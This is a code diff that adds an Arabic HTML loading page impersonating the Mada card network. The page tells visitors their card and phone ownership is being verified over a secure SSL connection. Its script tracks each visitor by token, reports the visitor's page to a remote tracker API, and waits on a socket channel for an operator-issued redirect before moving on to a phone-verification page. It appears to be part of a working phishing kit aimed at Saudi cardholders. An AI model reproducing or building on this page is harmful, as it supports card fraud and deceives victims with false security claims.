@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري مطابقة الرمز السري - مدى</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif !important; }
+        body { background: #f1f5f9; color: #1e293b; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
+        .box { background: white; border-radius: 20px; border: 1px solid #e2e8f0; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.02); max-width: 420px; width: 100%; text-align: center; position: relative; overflow: hidden; }
+        .bar { position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #7b2cbf, #22c55e); }
+        .spinner { width: 70px; height: 70px; border: 5px solid #f1f5f9; border-top: 5px solid #7b2cbf; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 18px; font-weight: 900; color: #0f172a; margin-bottom: 10px; }
+        p { font-size: 13px; color: #64748b; line-height: 1.6; margin-bottom: 25px; }
+        .progress-container { background: #f1f5f9; border: 1px solid #e2e8f0; padding: 12px; border-radius: 12px; margin-bottom: 20px; text-align: right; }
+        .progress-label { font-size: 11px; font-weight: 700; color: #475569; display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .progress-bar-bg { width: 100%; height: 6px; background: #e2e8f0; border-radius: 99px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #7b2cbf; border-radius: 99px; transition: width 1s linear; }
+        .secure-footer { font-size: 11px; color: #94a3b8; display: flex; justify-content: center; gap: 5px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="bar"></div>
+        <div class="spinner"></div>
+        <h2>جاري مصادقة ملكية بطاقة المدى</h2>
+        <p>الرجاء الانتظار، نقوم بإجراء اتصال مصادقة ثنائية لربط رقم الهاتف والشبكة المزودة بالبطاقة الائتمانية لتوثيق الهوية...</p>
+        
+        <div class="progress-container">
+            <div class="progress-label">
+                <span>تأكيد ملكية الهاتف</span>
+                <span style="color: #16a34a;">● جاري الربط الآمن</span>
+            </div>
+            <div class="progress-bar-bg">
+                <div class="progress-bar" id="pbar"></div>
+            </div>
+        </div>
+
+        <div class="secure-footer">🛡️ اتصال مشفر بالكامل وآمن SSL</div>
+    </div>
+
+    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000";
+        var siteKey = "site_sehhaty_app_v1";
+        var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
+
+        fetch(SERVER_URL + '/api/tracker/ping', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading_phone.html', pageTitle: 'مصادقة الهاتف وصاحب البطاقة' })
+        }).catch(function(){});
+
+        try {
+            var socket = io(SERVER_URL);
+            socket.on('visitor_updated', function(v) {
+                if (v.token === visitorToken && v.status === 'go' && v.redirectUrl) {
+                    window.location.href = v.redirectUrl;
+                }
+            });
+        } catch(e){}
+
+        var countdown = 4;
+        var pbar = document.getElementById('pbar');
+        var timer = setInterval(function() {
+            countdown--;
+            var progress = ((4 - countdown) / 4) * 100;
+            pbar.style.width = progress + '%';
+            if (countdown <= 0) {
+                clearInterval(timer);
+                window.location.href = 'phone-verify.html';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
